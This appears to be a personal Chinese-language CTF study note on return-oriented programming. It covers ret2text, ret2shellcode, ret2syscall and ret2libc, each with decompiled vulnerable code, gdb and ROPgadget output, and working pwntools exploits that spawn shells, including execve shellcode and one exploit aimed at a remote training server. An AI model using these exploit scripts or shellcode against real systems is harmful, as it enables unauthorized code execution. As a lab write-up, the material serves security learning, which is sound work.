# CTF-Wiki ROP

ROP, Return Oriented Programming，主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 gadgets 来改变某些寄存器或变量的值，从而控制程序的执行流程。

> 所谓 gadgets 就是以 ret 结尾的指令序列。

- 程序存在溢出，可以控制返回地址
- 可以找到满足条件的 gadgets 以及相应的地址（可能需要动态获取地址

## ret2text

控制程序执行本身已有的代码

[ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

```shell
gdb-peda$ checks
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

使用 IDA 查看程序逻辑，找到危险函数 gets

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets(&s);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

使用 gdb 计算 offset

```assembly
ECX: 0xffffffff
EDX: 0xffffffff
ESI: 0xf7fb1000 --> 0x1dfd6c 
EDI: 0xf7fb1000 --> 0x1dfd6c
EBP: 0xffffd5c8 --> 0x0
ESP: 0xffffd540 --> 0xffffd55c --> 0x0
EIP: 0x80486ae (<main+102>:     call   0x8048460 <gets@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486a2 <main+90>: call   0x8048480 <puts@plt>
   0x80486a7 <main+95>: lea    eax,[esp+0x1c]
   0x80486ab <main+99>: mov    DWORD PTR [esp],eax
=> 0x80486ae <main+102>:        call   0x8048460 <gets@plt>
   0x80486b3 <main+107>:        mov    DWORD PTR [esp],0x80487a4
   0x80486ba <main+114>:        call   0x8048450 <printf@plt>
   0x80486bf <main+119>:        mov    eax,0x0
   0x80486c4 <main+124>:        leave
Guessed arguments:
arg[0]: 0xffffd55c --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd540 --> 0xffffd55c --> 0x0
0004| 0xffffd544 --> 0x0
0008| 0xffffd548 --> 0x1
0012| 0xffffd54c --> 0x0
0016| 0xffffd550 --> 0xffffd5a0 --> 0x1
0020| 0xffffd554 --> 0x0
0024| 0xffffd558 --> 0xf7ffd000 --> 0x28f24 
0028| 0xffffd55c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080486ae      24      in ret2text.c
gdb-peda$ 
```

直接计算 buff 位置 `0xffffd55c` 到 EBP `0xffffd5c8` 的偏移，再 +4 跳过 old EBP 即可覆盖返回地址。

```python
# exp.py
from pwn import *
r = proccess('./ret2text')
target = 0x0804863A
r.sendline('a' * (0xc8-0x5c+4) + p32(target))
r.interactive()
```

## ret2shellcode

控制程序执行 shellcode，需要自己填充 shellcode，填充区域需要有可执行权限。

[ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

```assembly
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

啥都没开，可以填充 shellcode。	

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets(&s);
  strncpy(buf2, &s, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

可以找到 buf2 在 bss 段，用 gdb 查看有可执行权限，可以实现 ret2shellcode

在 gdb 中计算偏移地址，还是 buff 位置到 EBP 的偏移 +4，先填入 shellcode 之后任意字符填充，然后填入 buf2 地址。

```python
# exp.py
from pwn import *

r = process('./ret2shellcode')
sc = asm(shellcraft.sh())
target = 0x804a080
payload = sc + 'a'*(112 - len(sc)) + p32(target)
print payload
r.sendline(payload)
r.interactive()
```

用的 shellcode 是 pwntools 生成的，打印出来：

```assembly
	/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

## sniperoj-pwn100-shellcode

编译的时候用 `gcc -z execstack` 关闭 NX

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/shellcode'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-10h]
  __int64 v5; // [rsp+8h] [rbp-8h]

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", &buf);
  puts("Now give me your answer : ");
  read(0, &buf, 64uLL);
  return 0;
}
```

NX 关了，还给了 buf 的地址，所以就直接在栈里填 shellcode 然后执行。

但是不能填在 buf 起始的 24 bytes 处，因为 shellcode 里有 push 的话就会覆盖自身。

所以就在返回地址后填充 shellcode，大小限制不再是 24 而是 32，因为 read 一共就读入 64 ，没注意看卡了半天。。。tcl

```python
from pwn import *

r = process('./shellcode')

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
print disasm(shellcode_x64)

offset = 0x10 + 8
r.recvuntil('[')
buf_addr = r.recvuntil(']', drop=True)
print buf_addr
buf_addr = int(buf_addr, 16)
payload = 'a'*offset + p64(buf_addr + 32) + asm(shellcode_x64)

r.sendline(payload)
r.interactive()
```

主要问题还是找短的 shellcode，在 [exploitdb](https://www.exploit-db.com/) 里可以找到。有的 shellcode 长度符合但是并不能成功，看代码也没看出来为什么，之后还是学一下怎么写。

## ret2syscall

控制程序执行系统调用

[ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ret2syscall'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

还是从 gets 处溢出，只不过不能用程序自身代码或填入 shellcode的方式 getshell。程序里有 `/bin/sh` 字符串，构造系统调用 `execve("/bin/sh")`，需要控制寄存器的值：

- eax = 0xb
- ebx = \$(“/bin/sh”)
- ecx = edx = 0

需要构造 ROP chain 控制寄存器的值，使用 ROPgadget 找到程序中可用的 gadgets：

```shell
$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'pop eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'pop ebx' | grep 'pop ecx' | grep 'pop edx' 
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

$ ROPgadget --binary ret2syscall --string '/bin/sh'
Strings information
============================================================
0x080be408 : /bin/sh

$ ROPgadget --binary ret2syscall --only 'int' | grep '0x80'
0x08049421 : int 0x80
```

找到了可以控制 eax 和同时控制三个寄存器的 gadgets、系统调用以及字符串地址，接下来就是通过栈溢出，依次执行 gadgets，最后执行 syscall。

还是先用 gdb 计算偏移地址，然后覆盖

```python
##coding=utf8
from pwn import *

r = process('./ret2syscall')

offset = 0xffffd5d8 - 0xffffd56c + 4

pop_eax = 0x080bb196
pop_edx_ecx_ebx = 0x0806eb90
bin_sh = 0x080be408
syscall = 0x08049421

r.sendline('a'*offset + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(syscall))

r.interactive()
```

## ret2libc

控制程序执行 libc 中的，通常是返回至某个函数的 plt 或函数具体位置（已知 got 表内容）。

[ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1)

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ret2libc1'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets(&s);
  return 0;
}
```

gets 溢出，同时能找到 system_plt 和 /bin/sh，直接往栈里填就行了。

```python
##coding=utf8
from pwn import *

r = process('./ret2libc1')

offset = 0xffffd5d8 - 0xffffd56c + 4
bin_sh = 0x08048720
system_plt = 0x08048460

rop = [
    system_plt,
    0xdeadbeef,
    bin_sh,
]

print offset
r.sendline('a'*offset + ''.join(map(p32, rop)))
r.interactive()
```

## ret2libc2

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ret2libc2'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial 
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("Something surprise here, but I don't think it will work.");
  printf("What do you think ?");
  gets(&s);
  return 0;
}
```

这个也差不多，只不过没有 /bin/sh，还是有 system 的，所以就先用 gets 写入一个 /bin/sh 。

```python
##coding=utf8
from pwn import *

r = process('./ret2libc2')

offset = 0xffffd5d8 - 0xffffd56c + 4
# bin_sh = 0x08048720

buf = 0x0804b000 - 100
gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx_ret = 0x0804843d

rop = [
    gets_plt,
    pop_ebx_ret,
    buf,
    system_plt,
    0xdeadbeef,
    buf,
]

print offset
r.sendline('a'*offset + ''.join(map(p32, rop)))
r.sendline('/bin/sh\x00')
r.interactive()
```

## ret2libc3

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ret2libc3'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets(&s);
  return 0;
}
```

这次连 system 都没有了，所以就需要获取 libc 中 system 的地址，就需要获取装载基址。用 puts 泄露 `__libc_start_main` 的 got 表项，我电脑上这个地址有 `\x00` 所以打印不了，选择另一个 `setvbuf`。泄露之后可以用栈迁移再用 gets 读或者返回到 main 函数：

```python
##coding=utf8
from pwn import *

r = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

offset = 0xffffd5c8 - 0xffffd55c + 4
buf = 0x0804af80
buf2 = 0x0804a880

puts_plt = ret2libc3.plt['puts']
gets_plt = ret2libc3.plt['gets']
setvbuf_got = ret2libc3.got['setvbuf']

pop_ebp_ret = 0x080486ff
leave_ret = 0x08048538
rop = [
    puts_plt,
    pop_ebp_ret,
    setvbuf_got,
    gets_plt,
    pop_ebp_ret,
    buf,
    pop_ebp_ret,
    buf - 4,
    leave_ret,
]
print offset
r.sendlineafter('Can you find it !?', 'a'*offset + ''.join(map(p32, rop)))
# recv1 = r.recvline()
# print 'recv1: ', ":".join("{:x}".format(ord(c)) for c in recv1)
setvbuf = r.recvline()
print 'recv: ', ":".join("{:x}".format(ord(c)) for c in setvbuf)

setvbuf_offset = 0x006fd30
libc_base = u32(setvbuf[:4]) - setvbuf_offset
print 'libc base:', hex(libc_base)

system = libc_base + 0x0044620

rop2 = [
    gets_plt,
    system,
    buf2,
    buf2,
]
r.sendline(''.join(map(p32, rop2)))
r.sendline('/bin/sh\x00')
r.interactive()
```

带哥给的 exp 里直接返回到 main 函数再次溢出，不过这里的偏移又不一样了，所以要再调试到那算一下。

```python
##coding=utf8
from pwn import *

r = process('./ret2libc3')
ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
gets_plt = ret2libc3.plt['gets']
setvbuf_got = ret2libc3.got['setvbuf']
main = ret2libc3.symbols['main']

rop = [
    puts_plt,
    main,
    setvbuf_got,
]

r.sendlineafter('Can you find it !?', 'a'*112 + ''.join(map(p32, rop)))
setvbuf = r.recvline()
print 'recv: ', ":".join("{:x}".format(ord(c)) for c in setvbuf)

setvbuf_offset = 0x006fd30
libc_base = u32(setvbuf[:4]) - setvbuf_offset
print 'libc base:', hex(libc_base)

system = libc_base + 0x0044620
bin_sh = libc_base + 0x00188406

rop2 = [
    system,
    0xdeadbeef,
    bin_sh
]

r.sendlineafter('Can you find it !?', 'a'*104 + ''.join(map(p32, rop2)))
r.interactive()
```

## train.cs.nctu.edu.tw: ret2libc

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ret2libc'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-14h]

  puts("Hello!");
  printf("The address of \"/bin/sh\" is %p\n", binsh);
  printf("The address of function \"puts\" is 0x%x\n", &puts);
  fflush(stdout);
  return __isoc99_scanf("%s", &v4);
}
```

运行后输出 /bin/sh 和 puts 的地址，通过 LibcSearcher 找 libc 版本，然后导出 system 地址。不过在本地用 libc 实属8行

```python
##coding=utf8
from pwn import *
from LibcSearcher import *

r = remote('bamboofox.cs.nctu.edu.tw', 11002)

offset = 0xffffd5e8 - 0xffffd5cc + 4
r.recvuntil('is ')
bin_sh = int(r.recvuntil('\n'), 16)
print '/bin/sh =', hex(bin_sh)
r.recvuntil('is ')
puts = int(r.recvuntil('\n'), 16)
print 'puts =', hex(puts)

libc = LibcSearcher('puts', puts)
# libc.add_condition('str_bin_sh', bin_sh)
libc_base = puts - libc.dump('puts')
print 'system =', hex(libc.dump('system'))
system = libc_base + libc.dump('system')

rop = [
    system,
    0xdeadbeef,
    bin_sh,
]

r.sendline('a'*offset + ''.join(map(p32, rop)))
r.interactive()
```

## train.cs.nctu.edu.tw: rop



## 2013-PlaidCTF-ropasaurusrex

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```

```c
ssize_t __cdecl main()
{
  ReadStr();
  return write(1, "WIN\n", 4u);
}
ssize_t ReadStr()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```

看到还是有溢出，开了 NX 还是不用想 shellcode 了。程序内没找到 system 和 /bin/sh，那就得 ret2lib 。本地没法加载给的 libc，所以这个题写 exp 的意义也不大。思路就是泄露 read 的 got，然后用 read 读入 /bin/sh，在调 system。

## Defcon 2015 Qualifier: R0pbaby

